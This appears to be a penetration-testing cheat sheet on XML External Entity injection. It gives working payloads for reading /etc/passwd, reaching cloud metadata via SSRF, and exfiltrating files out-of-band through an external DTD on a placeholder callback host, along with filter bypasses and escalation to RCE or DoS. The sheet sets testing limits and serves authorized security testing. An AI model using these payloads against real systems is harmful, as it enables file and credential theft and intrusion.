# XXE — XML External Entity Injection

XML parser processes attacker-defined entities → file read, SSRF, sometimes RCE/
DoS. Anywhere XML (or XML-backed formats) is parsed. Read + reason; read only
proof files, OAST for blind.

## Where it lives

`Content-Type: application/xml`/`text/xml`, SOAP, SAML responses, RSS/Atom,
`.docx`/`.xlsx`/`.pptx`/`.svg`/`.xml` uploads, SVG image processing, config
import, XML-RPC, some JSON endpoints that also accept XML (flip the Content-Type).

## Payloads

**In-band file read**:
```
<?xml version="1.0"?>
<!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]>
<root>&x;</root>
```
**SSRF / metadata**:
```
<!ENTITY x SYSTEM "http://169.254.169.254/latest/meta-data/">
```
**Blind / OOB exfil (external DTD)**:
```
<!DOCTYPE r [<!ENTITY % p SYSTEM "http://OAST/evil.dtd"> %p;]>
```
evil.dtd:
```
<!ENTITY % f SYSTEM "file:///etc/passwd">
<!ENTITY % e "<!ENTITY &#37; x SYSTEM 'http://OAST/?d=%f;'>"> %e; %x;
```
**Parameter entities** when general entities are filtered; **error-based** exfil
via a DTD that forces the file into an error message.

## Bypasses

- Parser blocks `SYSTEM`/`DOCTYPE`? try parameter entities, UTF-16/UTF-7 encoding
  of the payload, or `<!DOCTYPE` case/whitespace tricks.
- JSON endpoint → resend as XML (`Content-Type: application/xml`) to reach an XML parser.
- SVG upload → embed the DTD; DOCX → edit `word/document.xml`.
- **PHP `expect://`**, `php://filter` for source; billion-laughs for DoS (report, don't detonate).

## Escalation

Local file read (source, `/etc/passwd`, secrets), SSRF → cloud metadata (chain
ssrf.md), internal port scan, RCE via PHP `expect`/Java gadgets, DoS.

## Safe PoC

Read `/etc/passwd` first line or an OAST callback proving external-entity fetch.
Blind → interactsh hit with the file contents in the query. Don't bulk-exfiltrate.

## Tools

Caido/Burp Repeater, **XXEinjector**, **Gopherus** (chains), interactsh + hosted
`evil.dtd`, docx/svg editors.

## References (current)

- PortSwigger Web Security Academy — XML external entity (XXE) injection.
- PayloadsAllTheThings — XXE Injection.
